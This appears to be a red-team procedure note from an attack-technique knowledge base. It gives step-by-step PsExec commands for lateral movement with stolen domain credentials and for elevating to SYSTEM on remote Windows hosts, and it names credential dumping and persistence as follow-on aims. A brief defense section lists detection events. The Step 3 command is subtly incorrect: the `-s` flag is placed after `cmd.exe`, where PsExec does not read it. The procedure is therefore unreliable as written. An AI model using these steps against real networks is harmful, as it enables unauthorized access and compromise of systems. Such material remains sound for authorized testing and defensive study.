---
type: procedure
tactics:
  - '[[Execution]]'
  - '[[Lateral Movement]]'
  - '[[Privilege-Escalation-via-Direct-URL-Access]]'
techniques:
  - '[[Valid Accounts]]'
  - '[[SMB-Windows Admin Shares]]'
sub_techniques: []
tags:
  - psexec
  - windows
  - lateral-movement
  - privilege-escalation
  - valid-accounts
commands:
  - '[[commands/psexec-execute-cmd-as-different-user-on-remote-host]]'
tools:
  - '[[tools/PsExec]]'
platforms:
  - Windows
skill_level: intermediate
impact_level: high
detection_risk: medium
verified: true
validated: true
---

# Windows-PsExec-with-Different-User-Credentials

## Summary

This procedure demonstrates how to use PsExec, a Sysinternals tool, to execute commands on a remote Windows system using alternative user credentials, including switching to the NT AUTHORITY\SYSTEM context for elevated privileges. It is commonly used for lateral movement or privilege escalation in Windows environments where valid domain or local admin credentials are available.

## Description

PsExec allows remote command execution over SMB by leveraging administrative shares and valid credentials, mimicking legitimate admin activities. In an attack scenario, an attacker with stolen credentials can use this to pivot to other systems, run payloads, or gain SYSTEM-level access without physical console interaction. This technique blends in with normal IT operations but can be detected through anomalous logins or tool usage. The procedure assumes network access to the target and focuses on safe, controlled execution in testing environments.

## Requirements

1. Valid domain or local administrative credentials for the target system
2. Network connectivity to the target host via SMB (ports 445 open)
3. PsExec tool downloaded and available on the attacker's machine
4. Administrative privileges on the attacker's local machine to run PsExec

## Defense

- Enforce least privilege access and monitor for credential usage across systems using tools like Microsoft ATA or SIEM
- Disable unnecessary admin shares (e.g., ADMIN$) and restrict SMB access via Group Policy
- Enable detailed auditing for process creation and logon events (Event IDs 4624, 4688) to detect remote executions
- Use endpoint detection tools to block or alert on PsExec binaries and their network patterns

## Objectives

1. Execute remote commands using alternate credentials to bypass local context limitations
2. Achieve elevated SYSTEM privileges on the target for further post-exploitation
3. Enable lateral movement to compromise additional network assets

## Instructions

### Step 1: Verify Network Connectivity and Credentials

**Context**: Before executing PsExec, confirm SMB access to the target and validate credentials to avoid lockouts or alerts. This step ensures the procedure can proceed without errors.

Use built-in tools like `net use` to test connectivity:

```cmd
net use \\TARGET_HOST\IPC$ /user:DOMAIN\USERNAME PASSWORD
```

> This mounts the IPC$ share; success confirms credential validity and SMB access. If it fails, check firewall rules or credential accuracy.

**Expected Output**: `The command completed successfully.` If failed: `System error 5 has occurred. Access is denied.`

### Step 2: Execute Remote Command as Alternate User

**Context**: Run a basic command (e.g., cmd.exe) on the remote host using the provided credentials. This establishes the remote session without elevation initially, allowing verification of access.

**Command** ([[commands/psexec-execute-cmd-as-different-user-on-remote-host]]):

```cmd
PsExec.exe \\TARGET_HOST -u DOMAIN\USERNAME -p PASSWORD cmd.exe
```

> This launches an interactive cmd shell on the remote system under the specified user context. Observe the prompt change to indicate remote execution. Use this to run simple commands like `whoami` to confirm the user context.

**Expected Output**: Remote cmd prompt appears, e.g., `C:\Windows\system32> whoami` returns `domain\username`.

### Step 3: Switch to SYSTEM Context for Elevation

**Context**: Once access is confirmed, re-execute PsExec with the `-s` flag to run under NT AUTHORITY\SYSTEM, granting full administrative privileges for tasks like dumping credentials or installing persistence.

**Command** ([[commands/psexec-execute-cmd-as-different-user-on-remote-host]]):

```cmd
PsExec.exe \\TARGET_HOST -u DOMAIN\USERNAME -p PASSWORD cmd.exe -s
```

> The `-s` flag impersonates the SYSTEM account. Run `whoami` again to verify elevation. This step is key for privilege escalation but increases detection risk due to SYSTEM-level actions.

**Expected Output**: Remote cmd prompt with `whoami` returning `nt authority\system`. No errors indicate successful elevation.

### Step 4: Verify and Clean Up

**Context**: Confirm the elevated session by running a privileged command, then disconnect to minimize footprint.

In the remote shell:

```cmd
whoami /priv
net session
```

> Lists privileges and active sessions. Type `exit` to close the remote cmd.

**Expected Output**: Output showing SeDebugPrivilege, SeLoadDriverPrivilege, etc., for SYSTEM. Active sessions list the connection.

